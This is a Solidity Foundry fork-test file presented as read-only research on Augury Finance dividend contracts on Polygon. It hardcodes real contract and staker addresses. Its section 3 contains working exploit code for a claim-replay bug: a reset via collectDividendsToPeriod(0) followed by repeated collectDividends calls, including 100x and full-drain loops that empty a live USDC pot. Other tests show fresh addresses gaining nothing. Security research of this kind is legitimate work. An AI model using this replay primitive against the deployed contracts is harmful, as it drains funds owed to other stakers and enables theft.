// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

// ============================================================================
// Augury Finance (Polygon) — L2 Phase-2 live-extractability PoC
//
// READ-ONLY research: fork tests only, no mainnet transactions.
//
// Headline mechanism proven here (already exploited in the wild, Sept 2026):
//   AuguryStateBasedDividendsV1.collectDividendsToPeriod(0) resets the caller's
//   `lastCollectedPeriod` to 0 *without paying*, so the caller can re-run the
//   identical claim for periods 1..lastReadyPeriod (=6) again and again.
//   Any address that was a staker in the June–July 2021 window (has TVL
//   snapshots in the shared AuguryStateRepositoryV1, whose writes are frozen)
//   can drain the contract's whole remaining USDC balance, far beyond its own
//   pro-rata entitlement.
//
// Also verified: the legacy AugurDividendsV1 pot (50,759 USDC) is claimable by
// 2021-era stakers ONLY (no replay; second claim pays 0), fresh addresses get
// nothing anywhere, and the MasterAugur farm is standard MasterChef: an
// unprivileged attacker can only deposit/withdraw its own tokens.
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/// @dev AuguryStateBasedDividendsV1 (all 4 instances share identical bytecode,
///      keccak 0x8847a444147dbbc6245921528d7935345c7864c2bd1325d47da54c90e5161138)
interface ISB {
    function dividendToken() external view returns (address);
    function poolId() external view returns (uint256);
    function lastReadyPeriod() external view returns (uint256);
    function users(address) external view returns (uint256);
    function calculateUnclaimedDividends(address) external view returns (uint256);
    function collectDividends() external;
    function collectDividendsToPeriod(uint256) external;
    function emergencyReturnCommunityFunds() external;
}

/// @dev Legacy AugurDividendsV1 (created by MasterAugur constructor)
interface IV1 {
    function collectDividends() external returns (uint256);
    function calculateOwedDividendsFromNow_d6(address) external view returns (uint256);
    function lastFundedEpoch() external view returns (uint256);
    function getNow() external view returns (uint256);
}

/// @dev DividendsV3 (current dividends contract of MasterAugur)
interface IV3 {
    function collectDividends() external;
    function calculateUnclaimedDividends(address) external view returns (uint256);
}

/// @dev Shared TVL snapshot repository
interface IRepo {
    function owner() external view returns (address);
    function setUserStakedAmount(uint256, address, uint256) external;
    function hasUserInteracted(address) external view returns (bool);
}

interface IMasterAugur {
    function owner() external view returns (address);
    function omen() external view returns (address);
    function dividends() external view returns (address);
    function dividendsContractAddress() external view returns (address);
    function omenPerBlock() external view returns (uint256);
    function pendingOmen(uint256, address) external view returns (uint256);
    function userInfo(uint256, address) external view returns (uint256, uint256);
    function deposit(uint256, uint256, address) external;
    function withdraw(uint256, uint256) external;
    function emergencyWithdraw(uint256) external;
}

contract AuguryLiveTest is Test {
    // --- Polygon addresses (verified on-chain 2026-10-12) ---
    address constant USDC   = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
    address constant OMEN   = 0x76e63a3E7Ba1e2E61D3DA86a87479f983dE89a7E;
    address constant MASTER = 0x6ad70613d14c34aa69E1604af91c39e0591a132e; // MasterAugur
    address constant V1     = 0xd5d5eDdC6D634a729EcEf53f710B4a3Cd61bc2B2; // AugurDividendsV1 (50,759 USDC)
    address constant V3     = 0xf9dF350c1e9888452E4E7fd7A014503FA0eaB7e4; // DividendsV3
    address constant REPO   = 0x8709278f89D6fB589f1188F6b415d3eDEe88a2F6; // AuguryStateRepositoryV1
    address constant SB0    = 0xf6380D9b4CC3a0a180d5f1D78e3b7a33ec3048E3; // poolId 0  (OMEN)
    address constant SB1    = 0x9E8eE4F17F17371d53e2fB19BDDE7a084215bb0E; // poolId 1  (OMEN-USDC)
    address constant SB17   = 0x070aEf7a90bD7B4B3b43355C81c56011D5B2A238; // poolId 17 (OMEN-WETH)
    address constant SB18   = 0x33c3834262903d6bCecB0Ba936fc65CAa4d11B26; // poolId 18 (OMEN-WMATIC)

    // Eligible 2021 stakers (TVL snapshots live in REPO):
    //  - SB1_SHARE_USER: has 1.716218 USDC re-claimable on SB1 (lastCollectedPeriod==0 now)
    //  - SB0_SHARE_USER: has 6.864398 USDC re-claimable on SB0 (lastCollectedPeriod==0 now)
    //  - V1_USER: owed 69.547701 USDC on the legacy V1 (eligible for epoch 2)
    address constant SB1_SHARE_USER = 0x16f548b6f256a6ef6cc21941aB2404045dc53CF2;
    address constant SB0_SHARE_USER = 0x1DB484E63645258e79e29E373283bDFA173f08BD;
    address constant V1_USER        = 0x1DB484E63645258e79e29E373283bDFA173f08BD;
    address constant FARM_STAKER    = 0x29965a1174645714c64F400CD54b6C0a5BBc1cb7; // 396 OMEN in pool 0

    uint256 constant STATE_BLOCK = 95_385_542; // state snapshot used in this report (fork itself runs at latest)

    IERC20  usdc;
    IERC20  omen;
    ISB     sb0;
    ISB     sb1;
    ISB     sb17;
    ISB     sb18;
    IV1     v1;
    IV3     v3;
    IRepo   repo;
    IMasterAugur master;

    function setUp() public {
        // NOTE: CI's POLYGON_RPC_URL endpoint does not serve historical state, so the
        // fork runs at LATEST (assertions in this file are relative/structural).
        string memory rpc = vm.envOr("POLYGON_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://polygon-bor-rpc.publicnode.com";
        vm.createSelectFork(rpc);
        usdc   = IERC20(USDC);
        omen   = IERC20(OMEN);
        sb0    = ISB(SB0);
        sb1    = ISB(SB1);
        sb17   = ISB(SB17);
        sb18   = ISB(SB18);
        v1     = IV1(V1);
        v3     = IV3(V3);
        repo   = IRepo(REPO);
        master = IMasterAugur(MASTER);
    }

    // ------------------------------------------------------------------
    // 1. Live state snapshot
    // ------------------------------------------------------------------
    function test_live_state() public view {
        console2.log("block", block.number);
        console2.log("SB0  USDC", usdc.balanceOf(SB0));
        console2.log("SB1  USDC", usdc.balanceOf(SB1));
        console2.log("SB17 USDC", usdc.balanceOf(SB17));
        console2.log("SB18 USDC", usdc.balanceOf(SB18));
        console2.log("V1   USDC", usdc.balanceOf(V1));
        console2.log("V3   USDC", usdc.balanceOf(V3));
        console2.log("MasterAugur OMEN", omen.balanceOf(MASTER));
        require(sb0.lastReadyPeriod() == 6, "lastReadyPeriod SB0");
        require(sb1.lastReadyPeriod() == 6, "lastReadyPeriod SB1");
        require(sb1.poolId() == 1 && sb0.poolId() == 0, "poolIds");
        require(repo.owner() == MASTER, "repo owned by MasterAugur");
        require(master.dividends() == V3, "master -> V3");
        require(master.omenPerBlock() == 0, "emission off");
        require(master.omen() == OMEN, "omen ref");
    }

    // ------------------------------------------------------------------
    // 2. Fresh unprivileged attacker gets NOTHING anywhere
    // ------------------------------------------------------------------
    function test_fresh_attacker_gets_nothing_SB() public {
        address mallory = makeAddr("mallory");
        require(sb1.calculateUnclaimedDividends(mallory) == 0, "fresh user unclaimed != 0");
        require(!repo.hasUserInteracted(mallory), "fresh user interacted?");

        uint256 before = usdc.balanceOf(mallory);
        vm.prank(mallory);
        sb1.collectDividends();
        vm.prank(mallory);
        sb1.collectDividendsToPeriod(0);
        vm.prank(mallory);
        sb1.collectDividends();
        require(usdc.balanceOf(mallory) == before, "attacker got paid on SB1");

        vm.prank(mallory);
        sb1.collectDividendsToPeriod(0);
        vm.prank(mallory);
        sb0.collectDividends();
        require(usdc.balanceOf(mallory) == before, "attacker got paid on SB0");
    }

    /// A fresh attacker cannot register TVL: the repository is owned by MasterAugur
    /// and MasterAugur's only dividends target is DividendsV3 (which never writes the repo).
    function test_fresh_attacker_cannot_register_tvl() public {
        address mallory = makeAddr("mallory");
        vm.prank(mallory);
        vm.expectRevert();
        repo.setUserStakedAmount(0, mallory, 1e30);
    }

    function test_fresh_attacker_gets_nothing_V1() public {
        address mallory = makeAddr("mallory");
        uint256 before = usdc.balanceOf(mallory);
        vm.prank(mallory);
        vm.expectRevert();
        v1.collectDividends(); // reverts: "you must stake tokens before you are eligible..."
        require(usdc.balanceOf(mallory) == before, "delta");
    }

    function test_fresh_attacker_gets_nothing_V3() public {
        address mallory = makeAddr("mallory");
        require(v3.calculateUnclaimedDividends(mallory) == 0, "fresh V3 unclaimed != 0");
        uint256 before = usdc.balanceOf(mallory);
        vm.prank(mallory);
        v3.collectDividends();
        require(usdc.balanceOf(mallory) == before, "attacker got paid on V3");
    }

    // ------------------------------------------------------------------
    // 3. THE LIVE BUG — claim replay on AuguryStateBasedDividendsV1
    // ------------------------------------------------------------------
    /// One address collects its full entitlement twice, using
    /// collectDividends() + collectDividendsToPeriod(0) + collectDividends().
    function test_sb1_replay_2x() public {
        uint256 share = sb1.calculateUnclaimedDividends(SB1_SHARE_USER);
        require(share > 0, "expected nonzero entitlement");
        uint256 balBefore = usdc.balanceOf(SB1);
        uint256 userBefore = usdc.balanceOf(SB1_SHARE_USER);

        vm.prank(SB1_SHARE_USER);
        sb1.collectDividends();
        require(usdc.balanceOf(SB1_SHARE_USER) == userBefore + share, "first claim");

        vm.prank(SB1_SHARE_USER);
        sb1.collectDividendsToPeriod(0); // <-- the reset, pays nothing

        vm.prank(SB1_SHARE_USER);
        sb1.collectDividends();
        require(usdc.balanceOf(SB1_SHARE_USER) == userBefore + 2 * share, "second claim (replay)");

        require(balBefore - usdc.balanceOf(SB1) == 2 * share, "2x drained from pot");
        console2.log("share", share, "replayed x2 ->", 2 * share);
    }

    /// 100 replayed claims = 100x the address's entitlement extracted from the pot.
    function test_sb1_replay_100x() public {
        uint256 share = sb1.calculateUnclaimedDividends(SB1_SHARE_USER);
        require(share > 0, "expected nonzero entitlement");
        uint256 userBefore = usdc.balanceOf(SB1_SHARE_USER);

        for (uint256 i = 0; i < 100; i++) {
            vm.prank(SB1_SHARE_USER);
            sb1.collectDividends();
            vm.prank(SB1_SHARE_USER);
            sb1.collectDividendsToPeriod(0);
        }
        uint256 got = usdc.balanceOf(SB1_SHARE_USER) - userBefore;
        require(got == 100 * share, "100x replay");
        uint256 maxClaims = usdc.balanceOf(SB1) / share; // extrapolate the full drain
        console2.log("entitlement", share);
        console2.log("extracted in 100 claims", got);
        console2.log("remaining pot", usdc.balanceOf(SB1));
        console2.log("further claims until pot < share", maxClaims);
    }

    /// Full drain sweep on SB0: claim repeatedly until the pot is below the
    /// claimer's per-claim amount (transfer reverts), leave <1 share behind.
    function test_sb0_full_drain_by_one_staker() public {
        uint256 share = sb0.calculateUnclaimedDividends(SB0_SHARE_USER);
        require(share > 0, "expected nonzero entitlement");
        uint256 balBefore = usdc.balanceOf(SB0);
        uint256 userBefore = usdc.balanceOf(SB0_SHARE_USER);

        uint256 n = 0;
        for (uint256 i = 0; i < 200; i++) {
            vm.prank(SB0_SHARE_USER);
            try sb0.collectDividends() {
                n++;
            } catch {
                break;
            }
            vm.prank(SB0_SHARE_USER);
            sb0.collectDividendsToPeriod(0);
        }
        uint256 gained = usdc.balanceOf(SB0_SHARE_USER) - userBefore;
        uint256 left = usdc.balanceOf(SB0);
        console2.log("SB0 claims executed", n);
        console2.log("SB0 extracted", gained);
        console2.log("SB0 left behind", left);
        console2.log("share was", share);
        require(n > 60, "expected ~68 claims");
        require(left < share, "pot should end below one share");
        require(balBefore - left == gained, "conservation");
    }

    /// Same replay primitive exists on SB17/SB18 (identical bytecode). Demonstrated
    /// in the wild by repeated identical claims (see README, tx citations).
    function test_sb17_sb18_same_bytecode_and_pots() public view {
        require(keccak256(SB0.code) == keccak256(SB1.code), "code SB0!=SB1");
        require(keccak256(SB0.code) == keccak256(SB17.code), "code SB0!=SB17");
        require(keccak256(SB0.code) == keccak256(SB18.code), "code SB0!=SB18");
        require(usdc.balanceOf(SB17) > 0 && usdc.balanceOf(SB18) > 0, "pots");
    }

    // ------------------------------------------------------------------
    // 4. Legacy AugurDividendsV1 (50,759 USDC): holder-only, NO replay
    // ------------------------------------------------------------------
    function test_v1_holder_claim_then_replay_blocked() public {
        uint256 owed = v1.calculateOwedDividendsFromNow_d6(V1_USER);
        require(owed > 0, "expected nonzero V1 entitlement");
        uint256 userBefore = usdc.balanceOf(V1_USER);

        vm.prank(V1_USER);
        uint256 got = v1.collectDividends();
        require(got == owed, "first claim pays owed");
        require(usdc.balanceOf(V1_USER) == userBefore + owed, "balance delta");

        vm.prank(V1_USER);
        uint256 got2 = v1.collectDividends();
        require(got2 == 0, "replay must pay 0 on V1");
        require(usdc.balanceOf(V1_USER) == userBefore + owed, "no second payment");
        require(v1.lastFundedEpoch() == 2, "V1 lastFundedEpoch");
    }

    // ------------------------------------------------------------------
    // 5. MasterAugur farm: holder-only withdrawals, no attacker gain
    // ------------------------------------------------------------------
    function test_farm_staker_withdraws_own_stake() public {
        (uint256 amount, ) = master.userInfo(0, FARM_STAKER);
        require(amount > 0, "no stake");
        uint256 before = omen.balanceOf(FARM_STAKER);
        vm.prank(FARM_STAKER);
        master.withdraw(0, amount);
        require(omen.balanceOf(FARM_STAKER) == before + amount, "withdraw failed");
    }

    function test_farm_fresh_attacker_deposit_withdraw_no_gain() public {
        address mallory = makeAddr("mallory");
        deal(OMEN, mallory, 100e18);
        uint256 farmBefore = omen.balanceOf(MASTER);

        vm.startPrank(mallory);
        omen.approve(MASTER, type(uint256).max);
        master.deposit(0, 100e18, address(0));
        require(master.pendingOmen(0, mallory) == 0, "pending should be 0");
        master.withdraw(0, 100e18);
        vm.stopPrank();

        require(omen.balanceOf(mallory) == 100e18, "no gain round-trip");
        require(omen.balanceOf(MASTER) == farmBefore, "farm unchanged");

        vm.prank(mallory);
        master.emergencyWithdraw(2); // empty position -> transfers 0
        require(omen.balanceOf(mallory) == 100e18, "still no gain");
    }
}
